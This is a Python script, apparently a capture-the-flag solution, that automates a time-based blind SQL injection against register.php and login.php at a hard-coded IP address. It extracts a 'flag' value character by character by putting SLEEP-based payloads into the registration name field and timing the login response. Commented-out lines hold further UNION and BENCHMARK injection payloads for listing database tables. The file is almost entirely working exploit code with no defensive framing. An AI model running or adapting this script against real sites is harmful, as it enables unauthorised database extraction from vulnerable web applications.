#python3
import string, requests
import random

# Extract table name
#QUERY = "' UNION SELECT null,null,(IF(BINARY SUBSTRING((SELECT table_name FROM information_schema.tables where TABLE_SCHEMA = database() and table_name != 'info'),{pos},1) = BINARY '{char}',BENCHMARK(5000000,ENCODE('MSG','by seconds')),null)) FROM info; -- -"
# Extract flag
#QUERY = "' UNION SELECT null,null,(IF(SUBSTRING((SELECT col_1 from (SELECT 1 as col_1 union select * from get_point limit 1 offset 2) x_table),1,1) = BINARY 'I',BENCHMARK(5000000,ENCODE('MSG','by seconds')),null)) FROM info; -- -"
URL = "http://35.220.140.18:8080/register.php"
URL2 = "http://35.220.140.18:8080/login.php"
#QUERY = "1'-IF(BINARY SUBSTRING((SELECT table_name FROM information_schema.tables where TABLE_SCHEMA = database() and table_name != 'info'),{pos},1)=BINARY '{char}',SLEEP(1),0) AND username='1"
#QUERY = "a'union SUBSTRING((SELECT table_name from  information_schema.tables  where TABLE_SCHEMA = database() and table_name != 'info'),1,1) = I -- -"
#QUERY = "a and substring(version(),1,1)like(5)"
#QUERY ="a' union select table_name from information_schema.tables where table_name = 'information_schema' and substr(table_name,1,1)='i'-- - "
QUERY="1 ' and if(Ascii(substring((SELECT flag FROM flag LIMIT 0,1),{pos},1))={i},SLEEP(2),0)-- -"




list_chars = string.printable.replace('%','')
output = ""
pos = 0

while True:
    pos += 1

    for i in range (48,126):
        mail=random.randint(10000,10000000)

        data = {    "name": QUERY.format(i=str(i), pos=str(pos)),
                    "email": str(mail)+"@gmail.com",
                    "password": "asdf",
                    "confirm":"asdf",
                    "submit":"Register"
                }
               
        data2 = {
                    "email": str(mail)+"@gmail.com",
                    "password": "asdf",
                    "submit":"Login"
                }
        request = requests.post(URL,data=data)
        request2= requests.post(URL2, data=data2)
        if (request2.elapsed.total_seconds() > 2):
            output += chr(i)+""
            print("[*] Output: " + output + "...")
            break


# while True:
#     pos += 1
#     for char in list_chars:
#         data = {
#             "name": QUERY.format(char=char, pos=str(pos)),
#             "email": str(mail)+"@gmail.com",
#             "password": "asdf",
#             "confirm":"asdf",
#             "submit":"Register"
#         }
       
#         data2 = {
#             "email": str(mail)+"@gmail.com",
#             "password": "asdf",
#             "submit":"Login"
#         }
#         request = requests.post(URL,data=data)
#         request2= requests.post(URL2, data=data2, allow_redirects=True)
#         print(request2)
#         print(request2.text)
#         output += char
#         print("[*] Output: " + output + "...")

        # data = {
        #     "username": "qwerty",
        #     "password": QUERY.format(char=char, pos=str(pos))

        # }
        # request = requests.post(URL,data=data)
        # if (request.elapsed.total_seconds() > 0.5): # True
        #     output += char
        #     print("[*] Output: " + output + "...")
        #     break